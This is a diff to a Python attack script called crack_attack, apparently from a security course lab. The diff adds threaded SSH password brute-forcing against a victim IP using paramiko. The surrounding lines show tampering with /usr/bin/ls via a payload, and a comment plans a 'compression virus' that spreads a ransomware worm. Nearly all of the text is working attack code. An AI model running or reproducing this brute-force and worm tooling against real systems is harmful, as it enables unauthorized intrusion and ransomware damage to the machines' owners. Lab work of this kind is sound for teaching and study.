@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 # ./crack_attack <Victim IP> <Attacker IP> <Attacker port> 
-# ./crack_attack 172.18.0.3 172.18.0.2 22
+# ./crack_attack 172.18.0.3 172.18.0.2 8888
 import paramiko
 import sys
 import itertools
@@ -8,6 +8,7 @@ import os
 import subprocess
 import binascii
 from zipfile import ZipFile, ZIP_DEFLATED
+import threading
 
 victim_ip = sys.argv[1]
 attacker_ip = sys.argv[2]
@@ -22,11 +23,12 @@ def ssh_login(host, port, username, password):
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         client.connect(host, port, username, password)
-        return True
-    except paramiko.AuthenticationException:
-        return False
-    finally:
+    except:
         client.close()
+        return False
+    else:
+        client.close()
+        return True
 
 def temp_ls_sign(payload):
     ls_path = "/usr/bin/ls"
@@ -109,13 +111,34 @@ def main():
             possible_combinations.append(password)
 
     # try each combination to login
-    Password = "csc2024"
-    # for password in possible_combinations:
-    #     # print('Trying password:', password)
-    #     if ssh_login(victim_ip, 22, 'csc2024', password):
-    #         Password = password
-    #         print('Password found:', password)
-    #         break
+    Password = ""
+    found_password = threading.Event()
+
+    def try_password(password):
+        nonlocal Password
+        if found_password.is_set():
+            return
+        if ssh_login(victim_ip, 22, 'csc2024', password):
+            Password = password
+            print('Password found:', password)
+            found_password.set()
+
+    threads = []
+    for password in possible_combinations:
+        if found_password.is_set():
+            break
+        print('Trying:', password)
+        thread = threading.Thread(target=try_password, args=(password,))
+        threads.append(thread)
+        thread.start()
+        if len(threads) >= 5:
+            print("--------------")
+            for thread in threads:
+                thread.join()
+            threads = []
+
+    for thread in threads:
+        thread.join()
 
     # task2: Create a compression virus with the propagation of the  ransomware worm 
     if ssh_login(victim_ip, 22, 'csc2024', Password):
